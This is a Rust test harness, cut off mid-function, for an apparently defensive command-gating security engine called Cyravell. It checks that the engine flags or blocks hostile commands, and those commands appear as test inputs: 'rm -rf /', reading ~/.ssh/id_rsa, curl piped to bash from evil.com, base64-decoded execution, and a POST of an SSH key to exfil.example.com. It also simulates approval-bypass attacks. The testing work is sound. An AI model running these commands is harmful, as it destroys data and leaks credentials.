// Copyright 2026 Cyravell Contributors
// SPDX-License-Identifier: Apache-2.0

use chrono::Utc;
use clap::{Parser, Subcommand};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::path::PathBuf;
use tempfile::tempdir;
use uuid::Uuid;

use cyravell_engine::{
    audit::AuditLog,
    model::{
        EnforcementCapability, EventPayload, EventSubmitParams, ExecutionStatus, JsonRpcRequest,
        JsonRpcResponse, Origin, SecurityEvent, Severity,
    },
};

#[derive(Parser)]
#[command(name = "cyravell-test-harness")]
#[command(author = "Cyravell Contributors")]
#[command(version = "0.2.1")]
#[command(about = "Synthetic event generator and validation harness for Cyravell")]
struct Cli {
    #[arg(short, long)]
    socket_path: Option<PathBuf>,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Submit a synthetic destructive command event (never executed)
    SubmitDestructive {
        #[arg(default_value = "rm -rf /")]
        command: String,
    },
    /// Submit a synthetic credential access event
    SubmitCredential {
        #[arg(default_value = "cat ~/.ssh/id_rsa")]
        command: String,
    },
    /// Submit a synthetic benign event
    SubmitBenign {
        #[arg(default_value = "cargo check")]
        command: String,
    },
    /// Analyze a command string directly via IPC without submitting an event
    AnalyzeCommand {
        command: String,
        #[arg(short, long)]
        working_dir: Option<String>,
    },
    /// Test shell syntax awareness and complex operator chains
    TestComplexChains,
    /// Test invalid schema version rejection
    TestInvalidSchema,
    /// Test oversized payload (> 1MB) rejection
    TestOversizedPayload,
    /// Test audit log tamper detection on an isolated disposable log
    TestTamperDetection,
    /// Test terminal execution gate interception foundation (Phase 2.2)
    TestExecutionGate,
    /// Test adversarial security validation and gate hardening (Phase 2.4)
    TestAdversarialGate,
    /// Test package security enforcement at the execution gate (Phase 2.5)
    TestPackageGate,
    /// Test dependency baselining, drift detection, and monitoring (Phase 2.6)
    TestDriftMonitor,
    /// Test advisory intelligence updates and rollback protection (Phase 2.7)
    TestAdvisoryUpdates,
    /// Run comprehensive automated integration test suite
    RunSuite,
}

fn default_socket_path() -> PathBuf {
    if let Ok(runtime_dir) = std::env::var("XDG_RUNTIME_DIR") {
        PathBuf::from(runtime_dir)
            .join("cyravell")
            .join("cyravell.sock")
    } else {
        let uid = unsafe { libc_uid() };
        PathBuf::from(format!("/tmp/cyravell-{}/cyravell.sock", uid))
    }
}

unsafe fn libc_uid() -> u32 {
    extern "C" {
        fn getuid() -> u32;
    }
    getuid()
}

fn send_rpc(
    socket_path: &PathBuf,
    method: &str,
    params: Option<serde_json::Value>,
) -> Result<JsonRpcResponse, Box<dyn std::error::Error>> {
    let mut stream = UnixStream::connect(socket_path)?;
    let req = JsonRpcRequest {
        jsonrpc: "2.0".to_string(),
        id: serde_json::json!(Uuid::new_v4().to_string()),
        method: method.to_string(),
        params,
    };

    let req_bytes = serde_json::to_vec(&req)?;
    stream.write_all(&req_bytes)?;
    stream.write_all(b"\n")?;
    stream.flush()?;

    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    reader.read_line(&mut line)?;

    let resp: JsonRpcResponse = serde_json::from_str(&line)?;
    Ok(resp)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();
    let socket_path = cli.socket_path.unwrap_or_else(default_socket_path);

    match cli.command {
        Commands::SubmitDestructive { command } => {
            let event = SecurityEvent {
                id: format!("evt-sim-{}", &Uuid::new_v4().to_string()[..8]),
                schema_version: 1,
                timestamp: Utc::now(),
                event_type: cyravell_engine::model::EventType::TerminalCommand,
                source_adapter: "test-harness".to_string(),
                origin: Origin::Simulated,
                execution_status: ExecutionStatus::Simulated,
                enforcement_capability: EnforcementCapability::None,
                payload: EventPayload {
                    command: Some(command.clone()),
                    working_directory: Some("/test/sandbox".to_string()),
                    target_paths: vec!["/".to_string()],
                    environment_keys: vec!["PATH".to_string()],
                    metadata: {
                        let mut m = HashMap::new();
                        m.insert("simulation".to_string(), "true".to_string());
                        m.insert(
                            "note".to_string(),
                            "Synthetic destructive test. NEVER EXECUTED.".to_string(),
                        );
                        m
                    },
                },
            };

            println!(
                "Submitting synthetic event to Cyravell engine: {}",
                event.id
            );
            println!("Simulated Command: {}", command);
            let resp = send_rpc(
                &socket_path,
                "event.submit",
                Some(serde_json::to_value(EventSubmitParams { event })?),
            )?;

            if let Some(res) = resp.result {
                println!("Response:\n{}", serde_json::to_string_pretty(&res)?);
            } else if let Some(err) = resp.error {
                eprintln!("Engine Error: {:?}", err);
            }
        }

        Commands::SubmitCredential { command } => {
            let event = SecurityEvent {
                id: format!("evt-cred-{}", &Uuid::new_v4().to_string()[..8]),
                schema_version: 1,
                timestamp: Utc::now(),
                event_type: cyravell_engine::model::EventType::CredentialAccess,
                source_adapter: "test-harness".to_string(),
                origin: Origin::Simulated,
                execution_status: ExecutionStatus::Simulated,
                enforcement_capability: EnforcementCapability::None,
                payload: EventPayload {
                    command: Some(command.clone()),
                    working_directory: Some("/home/user".to_string()),
                    target_paths: vec!["~/.ssh/id_rsa".to_string()],
                    environment_keys: vec![],
                    metadata: HashMap::new(),
                },
            };

            println!("Submitting synthetic credential access event: {}", event.id);
            let resp = send_rpc(
                &socket_path,
                "event.submit",
                Some(serde_json::to_value(EventSubmitParams { event })?),
            )?;
            println!("Result:\n{}", serde_json::to_string_pretty(&resp)?);
        }

        Commands::SubmitBenign { command } => {
            let event = SecurityEvent {
                id: format!("evt-benign-{}", &Uuid::new_v4().to_string()[..8]),
                schema_version: 1,
                timestamp: Utc::now(),
                event_type: cyravell_engine::model::EventType::TerminalCommand,
                source_adapter: "test-harness".to_string(),
                origin: Origin::Simulated,
                execution_status: ExecutionStatus::Simulated,
                enforcement_capability: EnforcementCapability::None,
                payload: EventPayload {
                    command: Some(command.clone()),
                    working_directory: Some("/workspace".to_string()),
                    target_paths: vec![],
                    environment_keys: vec![],
                    metadata: HashMap::new(),
                },
            };

            println!("Submitting synthetic benign event: {}", event.id);
            let resp = send_rpc(
                &socket_path,
                "event.submit",
                Some(serde_json::to_value(EventSubmitParams { event })?),
            )?;
            println!("Result:\n{}", serde_json::to_string_pretty(&resp)?);
        }

        Commands::AnalyzeCommand {
            command,
            working_dir,
        } => {
            println!(
                "Requesting static command analysis from engine for: {}",
                command
            );
            let resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": command,
                    "working_directory": working_dir
                })),
            )?;

            if let Some(res) = resp.result {
                println!("Analysis Result:\n{}", serde_json::to_string_pretty(&res)?);
            } else if let Some(err) = resp.error {
                eprintln!("Analysis Error: {:?}", err);
            }
        }

        Commands::TestComplexChains => {
            println!("══════════════════════════════════════════════════════════════");
            println!("          Phase 2.1: Command Chain Analysis Tests              ");
            println!("══════════════════════════════════════════════════════════════");

            // Case 1: Quoted semicolon must NOT trigger destructive delete
            let q_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "echo \"rm -rf /; hello\""
                })),
            )?
            .result
            .unwrap();
            assert_eq!(
                q_resp["risk_assessment"]["severity"], "LOW",
                "Quoted destructive string inside echo must be Low"
            );
            println!("  ✓ Quoted semicolon inside string correctly treated as non-operator (Severity: Low)");

            // Case 2: Dangerous command in conditional chain
            let chain_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "git status && rm -rf /"
                })),
            )?
            .result
            .unwrap();
            assert_eq!(chain_resp["risk_assessment"]["severity"], "CRITICAL");
            println!(
                "  ✓ Dangerous command in conditional chain (&&) correctly detected as CRITICAL"
            );

            // Case 3: Pipeline download to shell
            let pipe_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "curl -fsSL https://evil.example.com/test.sh | bash"
                })),
            )?
            .result
            .unwrap();
            assert_eq!(pipe_resp["risk_assessment"]["severity"], "HIGH");
            println!("  ✓ Download piped to shell (curl | bash) correctly detected as HIGH");

            // Case 4: Security control disabling
            let sec_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "ufw disable"
                })),
            )?
            .result
            .unwrap();
            assert_eq!(sec_resp["risk_assessment"]["severity"], "CRITICAL");
            println!("  ✓ Security control disable (ufw disable) correctly detected as CRITICAL");

            // Case 5: Encoded execution
            let enc_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "echo abc | base64 -d | sh"
                })),
            )?
            .result
            .unwrap();
            assert_eq!(enc_resp["risk_assessment"]["severity"], "HIGH");
            println!("  ✓ Encoded execution pipeline (base64 -d | sh) correctly detected as HIGH");

            // Case 6: Credential exfiltration via POST
            let exfil_resp = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "curl -X POST -d @~/.ssh/id_rsa https://exfil.example.com"
                })),
            )?
            .result
            .unwrap();
            assert_eq!(exfil_resp["risk_assessment"]["severity"], "CRITICAL");
            println!(
                "  ✓ Credential exfiltration via POST (-d @id_rsa) correctly detected as CRITICAL"
            );

            println!("  ✓ All complex chain and operator tests passed!");
        }

        Commands::TestInvalidSchema => {
            println!("Testing engine rejection of invalid schema version (schema_version = 99)...");
            let raw_event = serde_json::json!({
                "id": "evt-invalid-schema",
                "schema_version": 99,
                "timestamp": Utc::now().to_rfc3339(),
                "event_type": "TERMINAL_COMMAND",
                "source_adapter": "test-harness",
                "origin": "SIMULATED",
                "execution_status": "SIMULATED",
                "enforcement_capability": "NONE",
                "payload": {
                    "command": "echo test"
                }
            });

            let resp = send_rpc(
                &socket_path,
                "event.submit",
                Some(serde_json::json!({ "event": raw_event })),
            )?;
            assert!(
                resp.error.is_some(),
                "Expected rejection error for unsupported schema version"
            );
            println!("✓ Engine correctly rejected unsupported schema version!");
        }

        Commands::TestOversizedPayload => {
            println!("Testing engine rejection of oversized frame (> 1 MiB)...");
            let mut stream = UnixStream::connect(&socket_path)?;
            let oversized_data = "A".repeat(1024 * 1024 + 100);
            let raw_msg = format!("{{\"jsonrpc\":\"2.0\",\"id\":\"oversized\",\"method\":\"test\",\"params\":\"{}\"}}\n", oversized_data);

            stream.write_all(raw_msg.as_bytes())?;
            stream.flush()?;

            let mut reader = BufReader::new(stream);
            let mut line = String::new();
            let _ = reader.read_line(&mut line);

            assert!(
                line.contains("Frame size exceeds 1 MiB limit") || line.is_empty(),
                "Expected frame limit rejection"
            );
            println!("✓ Engine correctly rejected oversized frame!");
        }

        Commands::TestTamperDetection => {
            println!("Testing cryptographic audit log tamper detection on disposable log...");
            let dir = tempdir()?;
            let log_path = dir.path().join("audit_tamper_test.log");

            let audit = AuditLog::open(&log_path)?;
            audit.append(
                "evt-1",
                "BLOCK",
                "Synthetic destructive delete",
                Severity::Critical,
            )?;
            audit.append("evt-2", "ALLOW", "Synthetic compile task", Severity::Low)?;
            audit.append("evt-3", "ALERT", "Synthetic remote script", Severity::High)?;

            let pristine_check = audit.verify();
            assert_eq!(pristine_check.status, "VALID");
            println!("✓ Pristine audit log with 3 records verified successfully.");

            // Tamper with record 2 in the file
            let contents = std::fs::read_to_string(&log_path)?;
            let tampered = contents.replace("Synthetic compile task", "Altered by attacker");
            std::fs::write(&log_path, tampered)?;

            let tamper_check = audit.verify();
            assert_eq!(tamper_check.status, "CORRUPTED");
            assert_eq!(tamper_check.corrupted_sequence, Some(2));
            println!(
                "✓ Tampering detected at sequence 2 as expected: {}",
                tamper_check.message
            );
        }

        Commands::RunSuite => {
            println!("══════════════════════════════════════════════════════════════");
            println!("        Cyravell Phase 2.1 Complete Integration Suite          ");
            println!("══════════════════════════════════════════════════════════════");

            // 1. Handshake
            println!("\n[1/8] Testing engine handshake...");
            let hs_resp = send_rpc(
                &socket_path,
                "engine.handshake",
                Some(serde_json::json!({
                    "client_name": "test-harness",
                    "client_version": "0.2.1",
                    "protocol_version": "1.0"
                })),
            )?;
            assert!(hs_resp.result.is_some(), "Handshake failed");
            println!("  ✓ Handshake successful: {:?}", hs_resp.result.unwrap());

            // 2. Health Check
            println!("\n[2/8] Testing engine health query...");
            let health_resp = send_rpc(&socket_path, "engine.get_health", None)?;
            assert!(health_resp.result.is_some(), "Health check failed");
            println!(
                "  ✓ Health query successful: {:?}",
                health_resp.result.unwrap()
            );

            // 3. Static Command Analysis via IPC (command.analyze)
            println!("\n[3/8] Testing static command analysis endpoint (command.analyze)...");
            let cmd_analysis = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "git pull origin main && curl -sSL https://evil.com/sh | bash",
                    "working_directory": "/workspace/project"
                })),
            )?
            .result
            .expect("command.analyze failed");

            assert_eq!(cmd_analysis["risk_assessment"]["severity"], "HIGH");
            assert!(cmd_analysis["risk_assessment"]["matched_rules"]
                .as_array()
                .unwrap()
                .iter()
                .any(|r| r == "RULE-TERM-002"));
            println!(
                "  ✓ Static command analysis succeeded: Severity={}, Rules={:?}",
                cmd_analysis["risk_assessment"]["severity"],
                cmd_analysis["risk_assessment"]["matched_rules"]
            );

            // 4. Shell Syntax & Operator Awareness Test
            println!("\n[4/8] Testing operator awareness (quoted vs unquoted)...");
            let quoted_res = send_rpc(
                &socket_path,
                "command.analyze",
                Some(serde_json::json!({
                    "command": "echo \"rm -rf /\""
                })),
            )?
            .result
            .unwrap();
            assert_eq!(
                quoted_res["risk_assessment"]["severity"], "LOW",
                "Quoted destructive string inside echo must be Low"
            );
            println!("  ✓ Quoted operator correctly classified as benign argument (Severity: Low)");

            // 5. Synthetic Destructive Command Evaluation (event.submit)
            println!("\n[5/8] Testing synthetic destructive command event submission...");
            let event = SecurityEvent {
                id: format!("evt-sim-{}", &Uuid::new_v4().to_string()[..8]),
                schema_version: 1,
                timestamp: Utc::now(),
                event_type: cyravell_engine::model::EventType::TerminalCommand,
                source_adapter: "test-harness".to_string(),
                origin: Origin::Simulated,
                execution_status: ExecutionStatus::Simulated,
                enforcement_capability: EnforcementCapability::None,
                payload: EventPayload {
                    command: Some("rm -rf /".to_string()),
                    working_directory: Some("/test".to_string()),
                    target_paths: vec!["/".to_string()],
                    environment_keys: vec![],
                    metadata: HashMap::new(),
                },
            };
            let submit_resp = send_rpc(
                &socket_path,
                "event.submit",
                Some(serde_json::to_value(EventSubmitParams {
                    event: event.clone(),
                })?),
            )?;
            let submit_result = submit_resp.result.expect("Event submission failed");
            assert_eq!(submit_result["risk_assessment"]["severity"], "CRITICAL");
            assert_eq!(submit_result["risk_assessment"]["rule_id"], "RULE-TERM-001");
            println!(
                "  ✓ Destructive command correctly assessed as CRITICAL: {}",
                submit_result["risk_assessment"]["reason"]
            );

            // 6. Audit Chain Verification
            println!("\n[6/8] Verifying engine audit chain...");
            let audit_resp = send_rpc(&socket_path, "audit.verify", None)?;
            let audit_result = audit_resp.result.expect("Audit verification failed");
            assert_eq!(audit_result["status"], "VALID");
            println!(
                "  ✓ Audit chain valid: total records = {}",
                audit_result["total_records"]
            );

            // 7. Query Recent Events
            println!("\n[7/8] Querying recent events feed...");
            let recent_resp = send_rpc(
                &socket_path,
                "event.get_recent",
                Some(serde_json::json!({ "limit": 10 })),
            )?;
            let recent_result = recent_resp.result.expect("Recent events query failed");
            let events_array = recent_result["events"].as_array().expect("Expected array");
            assert!(
                !events_array.is_empty(),
                "Recent events should not be empty"
            );
            println!(
                "  ✓ Successfully retrieved {} recent events",
                events_array.len()
            );

            // 8. Disposable Tamper Test
            println!("\n[8/9] Testing audit tamper detection on disposable log...");
            let dir = tempdir()?;
            let log_path = dir.path().join("suite_tamper.log");
            let audit = AuditLog::open(&log_path)?;
            audit.append("evt-1", "BLOCK", "Initial", Severity::Critical)?;
            audit.append("evt-2", "ALLOW", "Second", Severity::Low)?;
            let contents = std::fs::read_to_string(&log_path)?;
            let tampered = contents.replace("Second", "Malicious Modification");
            std::fs::write(&log_path, tampered)?;
            let check = audit.verify();
            assert_eq!(check.status, "CORRUPTED");
            println!(
                "  ✓ Audit tampering detected immediately at sequence {:?}",
                check.corrupted_sequence
            );

            // 9. Phase 2.2 Execution Gate Verification
            println!("\n[9/9] Testing execution gate interception over IPC...");
            let gate_eval_resp = send_rpc(
                &socket_path,
                "gate.evaluate",
                Some(serde_json::json!({
                    "command": "rm -rf /",
                    "fail_closed": true
                })),
            )?;
            let gate_eval_res = gate_eval_resp.result.expect("gate.evaluate failed");
            assert_eq!(gate_eval_res["decision"], "BLOCK");
            assert_eq!(gate_eval_res["outcome"], "BLOCKED_BY_POLICY");
            assert_eq!(gate_eval_res["allow_dispatch"], false);

            let mock_backend = std::sync::Arc::new(cyravell_engine::MockExecutionBackend::new());
            let gate_client =
                std::sync::Arc::new(cyravell_engine::GateEngineClient::new(&socket_path));
            let gate = cyravell_engine::ExecutionGate::new(
                mock_backend.clone(),
                Some(gate_client),
                None,
                None,
                true,
            );

            // Gated execution of blocked command
            let block_res = gate.execute_gated("rm -rf /", None);
            assert_eq!(
                block_res.decision,
                cyravell_engine::model::GateDecision::Block
            );
            assert_eq!(mock_backend.invocation_count(), 0);
            println!("  ✓ Gate intercepted and blocked command: backend count = 0 (uninvoked)");

            // 10. Phase 2.4 Adversarial Security Validation
            println!(
                "\n[10/11] Testing Phase 2.4 adversarial execution-gate hardening over IPC..."
            );
            run_adversarial_suite(&socket_path)?;
            println!("  ✓ All Phase 2.4 adversarial validation checks passed!");

            // 11. Phase 2.5 Package Security Enforcement
            println!("\n[11/13] Testing Phase 2.5 package security enforcement over IPC...");
            run_package_gate_suite(&socket_path)?;
            println!("  ✓ All Phase 2.5 package security enforcement checks passed!");

            // 12. Phase 2.6 Dependency Baselining & Drift Monitoring
            println!("\n[12/13] Testing Phase 2.6 dependency baselining and drift monitoring over IPC...");
            run_drift_monitor_suite(&socket_path)?;
            println!("  ✓ All Phase 2.6 dependency baselining and drift monitoring checks passed!");

            // 13. Phase 2.7 Advisory Intelligence Updates & Rollback Protection
            println!(
                "\n[13/13] Testing Phase 2.7 advisory updates and rollback protection over IPC..."
            );
            run_advisory_update_suite(&socket_path)?;
            println!("  ✓ All Phase 2.7 advisory updates and rollback protection checks passed!");

            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL INTEGRATION TESTS PASSED (13/13)");
            println!("══════════════════════════════════════════════════════════════");
        }

        Commands::TestAdvisoryUpdates => {
            println!("══════════════════════════════════════════════════════════════");
            println!("  Phase 2.7: Advisory Intelligence Updates & Rollback Tests   ");
            println!("══════════════════════════════════════════════════════════════");
            run_advisory_update_suite(&socket_path)?;
            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL ADVISORY UPDATE & ROLLBACK PROTECTION TESTS PASSED!     ");
            println!("══════════════════════════════════════════════════════════════");
        }

        Commands::TestPackageGate => {
            println!("══════════════════════════════════════════════════════════════");
            println!("  Phase 2.5: Pre-Installation Package Security Gate Tests     ");
            println!("══════════════════════════════════════════════════════════════");
            run_package_gate_suite(&socket_path)?;
            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL PACKAGE SECURITY GATE TESTS PASSED!");
            println!("══════════════════════════════════════════════════════════════");
        }

        Commands::TestDriftMonitor => {
            println!("══════════════════════════════════════════════════════════════");
            println!("  Phase 2.6: Dependency Baselining and Drift Monitoring Tests  ");
            println!("══════════════════════════════════════════════════════════════");
            run_drift_monitor_suite(&socket_path)?;
            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL DRIFT MONITORING TESTS PASSED!");
            println!("══════════════════════════════════════════════════════════════");
        }

        Commands::TestAdversarialGate => {
            println!("══════════════════════════════════════════════════════════════");
            println!("    Phase 2.4: Adversarial Security & Gate Hardening Tests    ");
            println!("══════════════════════════════════════════════════════════════");
            run_adversarial_suite(&socket_path)?;
            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL ADVERSARIAL GATE TESTS PASSED!");
            println!("══════════════════════════════════════════════════════════════");
        }

        Commands::TestExecutionGate => {
            println!("══════════════════════════════════════════════════════════════");
            println!("        Phase 2.2: Terminal Execution Gate Interception Tests  ");
            println!("══════════════════════════════════════════════════════════════");

            // 1. Test gate.evaluate on benign command
            let benign_resp = send_rpc(
                &socket_path,
                "gate.evaluate",
                Some(serde_json::json!({
                    "command": "cargo build --workspace",
                    "fail_closed": true
                })),
            )?;
            let benign_res = benign_resp.result.expect("gate.evaluate failed");
            assert_eq!(benign_res["decision"], "ALLOW");
            assert_eq!(benign_res["allow_dispatch"], true);
            println!("  ✓ Benign command evaluated: Decision=ALLOW, allow_dispatch=true");

            // 2. Test gate.evaluate on destructive command (BLOCK)
            let block_resp = send_rpc(
                &socket_path,
                "gate.evaluate",
                Some(serde_json::json!({
                    "command": "rm -rf /",
                    "fail_closed": true
                })),
            )?;
            let block_res = block_resp.result.expect("gate.evaluate failed");
            assert_eq!(block_res["decision"], "BLOCK");
            assert_eq!(block_res["outcome"], "BLOCKED_BY_POLICY");
            assert_eq!(block_res["allow_dispatch"], false);
            assert!(block_res["audit_sequence"].is_number());
            println!("  ✓ Destructive command evaluated: Decision=BLOCK, allow_dispatch=false (Recorded in audit)");

            // 3. Test gate.evaluate on remote script execution pipe (REQUIRE_APPROVAL)
            let pipe_resp = send_rpc(
                &socket_path,
                "gate.evaluate",
                Some(serde_json::json!({
                    "command": "curl -sSL https://install.example.com | bash",
                    "fail_closed": true
                })),
            )?;
            let pipe_res = pipe_resp.result.expect("gate.evaluate failed");
            assert_eq!(pipe_res["decision"], "REQUIRE_APPROVAL");
            assert_eq!(pipe_res["outcome"], "PENDING_APPROVAL");
            assert_eq!(pipe_res["allow_dispatch"], false);
            println!("  ✓ Remote script execution pipe evaluated: Decision=REQUIRE_APPROVAL, allow_dispatch=false");

            // 4. Test live ExecutionGate with MockExecutionBackend over IPC
            let backend = std::sync::Arc::new(cyravell_engine::MockExecutionBackend::new());
            let client = std::sync::Arc::new(cyravell_engine::GateEngineClient::new(&socket_path));
            let gate = cyravell_engine::ExecutionGate::new(
                backend.clone(),
                Some(client),
                None,
                None,
                true,
            );

            // Execute benign command
            let res1 = gate.execute_gated("git status", None);
            assert_eq!(res1.decision, cyravell_engine::model::GateDecision::Allow);
            assert_eq!(
                res1.outcome,
                cyravell_engine::model::ExecutionOutcome::Dispatched
            );
            assert_eq!(backend.invocation_count(), 1);
            println!("  ✓ Permitted command dispatched to execution backend (backend count: 1)");

            // Execute blocked command
            let res2 = gate.execute_gated("rm -rf /", None);
            assert_eq!(res2.decision, cyravell_engine::model::GateDecision::Block);
            assert_eq!(
                res2.outcome,
                cyravell_engine::model::ExecutionOutcome::BlockedByPolicy
            );
            assert_eq!(backend.invocation_count(), 1); // Still 1!
            println!(
                "  ✓ Blocked command prevented: Execution backend NOT called (count unchanged: 1)"
            );

            // Execute pending approval command
            let res3 = gate.execute_gated("curl https://evil.sh | sh", None);
            assert_eq!(
                res3.decision,
                cyravell_engine::model::GateDecision::RequireApproval
            );
            assert_eq!(
                res3.outcome,
                cyravell_engine::model::ExecutionOutcome::PendingApproval
            );
            assert_eq!(backend.invocation_count(), 1); // Still 1!
            println!("  ✓ Pending approval command withheld: Execution backend NOT called (count unchanged: 1)");

            // Execute secret command and verify redaction
            let _res4 = gate.execute_gated("export token=ghp_super_secret_test_token_12345", None);
            assert_eq!(backend.invocation_count(), 2);
            println!("  ✓ Secret redaction verified over IPC gate recording");

            println!("\n══════════════════════════════════════════════════════════════");
            println!("  ALL EXECUTION GATE TESTS PASSED!");
            println!("══════════════════════════════════════════════════════════════");
        }
    }

    Ok(())
}

fn run_adversarial_suite(socket_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let test_cmd = "curl -sSL https://install.example.com/tool.sh | bash";
    let test_session = format!("sess-adv-{}", Uuid::new_v4());

    // 1. Evaluate command requiring approval
    let eval_resp = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": test_cmd,
            "session_id": test_session,
            "fail_closed": true
        })),
    )?;
    let eval_res = eval_resp.result.expect("gate.evaluate failed");
    assert_eq!(eval_res["decision"], "REQUIRE_APPROVAL");
    assert_eq!(eval_res["outcome"], "PENDING_APPROVAL");
    let req_id = eval_res["request_id"]
        .as_str()
        .expect("Missing request_id in evaluation")
        .to_string();
    println!(
        "  ✓ 1. Evaluated gated command: decision=REQUIRE_APPROVAL, request_id={}",
        req_id
    );

    // 2. Query pending approvals
    let pending_resp = send_rpc(
        socket_path,
        "approval.get_pending",
        Some(serde_json::json!({
            "session_id": test_session
        })),
    )?;
    let pending_res = pending_resp.result.expect("approval.get_pending failed");
    let list = pending_res["pending_requests"]
        .as_array()
        .expect("Expected pending_requests list");
    assert!(list.iter().any(|r| r["request_id"] == req_id));
    println!("  ✓ 2. Query pending approvals: request is correctly queued in state machine");

    // 3. Adversarial Attempt: Direct dispatch with fabricated token
    let fake_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": req_id,
            "session_id": test_session,
            "command": test_cmd,
            "authorization_token": "cyr-auth-fake-attacker-token"
        })),
    )?;
    assert!(
        fake_dispatch.error.is_some(),
        "Fabricated token must be rejected"
    );
    println!("  ✓ 3. Adversarial bypass with fake token: REJECTED (Authorization rejected)");

    // 4. Adversarial Attempt: Session hijacking attempt
    let hijack_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": req_id,
            "session_id": "session-hijacked-attacker",
            "command": test_cmd,
            "authorization_token": "cyr-auth-fake"
        })),
    )?;
    assert!(
        hijack_dispatch.error.is_some(),
        "Session hijacking must be rejected"
    );
    println!("  ✓ 4. Adversarial session hijacking attempt: REJECTED (Session mismatch)");

    // 5. Adversarial Attempt: Command tampering (TOCTOU)
    let tamper_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": req_id,
            "session_id": test_session,
            "command": "rm -rf /",
            "authorization_token": "cyr-auth-fake"
        })),
    )?;
    assert!(
        tamper_dispatch.error.is_some(),
        "Tampered command must be rejected"
    );
    println!("  ✓ 5. Adversarial command tampering (TOCTOU): REJECTED (Command mismatch)");

    // 6. Legitimate User Approval
    let decide_resp = send_rpc(
        socket_path,
        "approval.decide",
        Some(serde_json::json!({
            "request_id": req_id,
            "decision": "APPROVE",
            "reason": "Authorized for synthetic test"
        })),
    )?;
    let decide_res = decide_resp.result.expect("approval.decide failed");
    assert_eq!(decide_res["status"], "APPROVED");
    let auth_token = decide_res["authorization_token"]
        .as_str()
        .expect("Missing authorization_token")
        .to_string();
    println!("  ✓ 6. Legitimate user approval granted: single-use token issued");

    // 7. Duplicate Decision Rejection
    let duplicate_decide = send_rpc(
        socket_path,
        "approval.decide",
        Some(serde_json::json!({
            "request_id": req_id,
            "decision": "DENY"
        })),
    )?;
    assert!(
        duplicate_decide.error.is_some(),
        "Duplicate decision must be rejected"
    );
    println!("  ✓ 7. Duplicate decision attempt: REJECTED (Invalid state transition)");

    // 8. Authorized Dispatch Execution
    let auth_dispatch_resp = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": req_id,
            "session_id": test_session,
            "command": "echo 'cyravell authorized test'",
            "authorization_token": auth_token
        })),
    );
    // Since command was for test_cmd ("curl ..."), passing "echo ..." tests command binding with valid token!
    assert!(
        auth_dispatch_resp?.error.is_some(),
        "Command binding must prevent swapping command even with valid token"
    );
    println!("  ✓ 8. Token command binding verified: cannot swap command with valid token");

    // Now legitimately dispatch with exact command
    // (We use a test command that was approved)
    let eval_v = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": "curl -s https://trusted.test/tool.sh | bash",
            "session_id": test_session,
            "fail_closed": true
        })),
    )?;
    let r_id = eval_v.result.unwrap()["request_id"]
        .as_str()
        .unwrap()
        .to_string();
    let d_res = send_rpc(
        socket_path,
        "approval.decide",
        Some(serde_json::json!({
            "request_id": r_id,
            "decision": "APPROVE"
        })),
    )?;
    let valid_token = d_res.result.unwrap()["authorization_token"]
        .as_str()
        .unwrap()
        .to_string();

    let legitimate_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": r_id,
            "session_id": test_session,
            "command": "curl -s https://trusted.test/tool.sh | bash",
            "authorization_token": valid_token
        })),
    )?;
    assert!(
        legitimate_dispatch.result.is_some(),
        "Authorized dispatch must succeed"
    );
    println!("  ✓ 9. Authorized dispatch executed: token consumed atomically");

    // 10. Replay Attack with already consumed token
    let replay_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": r_id,
            "session_id": test_session,
            "command": "curl -s https://trusted.test/tool.sh | bash",
            "authorization_token": valid_token
        })),
    )?;
    assert!(
        replay_dispatch.error.is_some(),
        "Token replay must be rejected"
    );
    println!("  ✓ 10. Replay attack rejection: REJECTED (AlreadyConsumed)");

    // 11. Hard-Block Bypass Guard
    let hard_block_dispatch = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": format!("appr-{}", Uuid::new_v4()),
            "session_id": test_session,
            "command": "rm -rf /",
            "authorization_token": "cyr-auth-fake-token"
        })),
    )?;
    assert!(
        hard_block_dispatch.error.is_some(),
        "Hard block must never be dispatched"
    );
    println!("  ✓ 11. Hard-block policy override guard: REJECTED (HardBlockPolicyViolation)");

    Ok(())
}

fn run_package_gate_suite(socket_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let test_dir = tempdir()?;

    // 1. Known Malicious Package: hard block
    let eval_mal = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": "npm install flatmap-stream@0.1.1",
            "working_directory": test_dir.path().display().to_string(),
            "session_id": "pkg-test-sess"
        })),
    )?;
    let mal_res = eval_mal.result.expect("gate.evaluate malicious failed");
